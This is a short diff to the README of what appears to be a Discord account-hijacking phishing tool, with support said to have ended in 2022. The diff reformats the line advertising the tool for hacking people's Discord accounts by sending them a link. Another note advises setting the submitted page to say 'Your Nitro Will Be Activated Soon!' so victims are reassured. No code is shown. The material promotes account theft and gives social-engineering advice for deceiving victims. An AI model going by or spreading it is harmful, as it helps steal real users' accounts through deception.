@@ -7,7 +7,8 @@
 > [!WARNING]
 > SUPPORT FOR THE REPO HAS BEEN DROPPED IN 2022. FOLLOW UP QUESTIONS WONT BE ANSWERED IN DISCORD
 
-hack people's discord with sending them a link!
+> [!NOTE]
+> hack people's discord with sending them a link!
 
 > [!NOTE]
 >Note: you can set anything in the file "submited.php".   I recommend you to change the content of it to "Your Nitro Will Be Activated Soon!"
